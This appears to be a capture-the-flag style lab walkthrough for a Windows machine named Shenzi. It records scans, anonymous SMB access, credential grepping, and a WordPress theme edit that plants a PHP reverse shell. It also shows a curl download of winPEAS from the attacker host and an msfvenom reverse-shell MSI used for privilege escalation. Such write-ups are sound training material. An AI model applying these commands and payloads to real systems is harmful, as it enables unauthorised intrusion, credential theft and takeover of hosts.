# NMAP 

```
sudo nmap -sC -sV 192.168.236.55 -oN nmap-shenzi
```

![[PG/Windows/attachments/Pasted image 20250707003036.png]]

All ports
![[PG/Windows/attachments/Pasted image 20250707003649.png]]

# Web (Port 443)
![[PG/Windows/attachments/Pasted image 20250707003347.png]]


## Feroxbuster
```
feroxbuster -u https://192.168.236.55/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```


# Web (Port 80)

Same thing 
![[PG/Windows/attachments/Pasted image 20250707003527.png]]

```
feroxbuster -u http://192.168.236.55/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt    
```

# FTP 

![[PG/Windows/attachments/Pasted image 20250707003755.png]]

# SMB

```
smbclient -N -L //192.168.236.55
```

![[PG/Windows/attachments/Pasted image 20250707004511.png]]

```
smbclient -N //192.168.236.55/Shenzi
```

Files of interest

![[PG/Windows/attachments/Pasted image 20250707004653.png]]

Get everything with 

```
mget *
```

Grep for passwords in a lot of files 

```
grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'
```

![[PG/Windows/attachments/Pasted image 20250707005055.png]]

^ Wordpress creds 

Guessing at missing subdirectory bc unsure where wordpress site is 

![[PG/Windows/attachments/Pasted image 20250707005446.png]]
- found it and GREAT date


Login with found creds 
![[PG/Windows/attachments/Pasted image 20250707005556.png]]

Wordpress scan in bg 

```
wpscan --url http://192.168.236.55/shenzi -e ap,at,u --plugins-detection aggressive -t 20
```

Go to theme editor 2020 

![[PG/Windows/attachments/Pasted image 20250707005909.png]]

Select template 

![[PG/Windows/attachments/Pasted image 20250707005928.png]]

Select and remove all the text to replace this with a malicious PHP rev-shell

Use the Ivan Sincek selection from revshell.com

![[PG/Windows/attachments/Pasted image 20250707010220.png]]

Update file and navigate to 404 page 

```
# You can see the sytax here if you have ever Bruteforced a WordPress site.
# Knowing this structure is worthwhile. It will come up again.
# http://$IP/WP-Root-Install/themes/theme-year-name/404.php

http://192.168.236.55/shenzi/themes/twentytwenty/404.php
```

![[PG/Windows/attachments/Pasted image 20250707010530.png]]

Catch rev shell

![[PG/Windows/attachments/Pasted image 20250707010609.png]]

![[PG/Windows/attachments/Pasted image 20250707010738.png]]

```
curl http://192.168.45.152/winPEASx64.exe -o winpeas.exe
```

![[PG/Windows/attachments/Pasted image 20250707011653.png]]

.msi files (Microsoft Software Installer) are automatically installed with Administrative privileges

# Priv Esc with malicious .msi file

Create rev shell payload file 

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR tun0 IP> LPORT=445 -f msi -o shell.msi
```

Set up a new listener (this time on port 445).

Transfer file
![[PG/Windows/attachments/Pasted image 20250707011834.png]]

Execute it 

![[PG/Windows/attachments/Pasted image 20250707011859.png]]

Catch system shell
![[PG/Windows/attachments/Pasted image 20250707012232.png]]

![[PG/Windows/attachments/Pasted image 20250707012342.png]]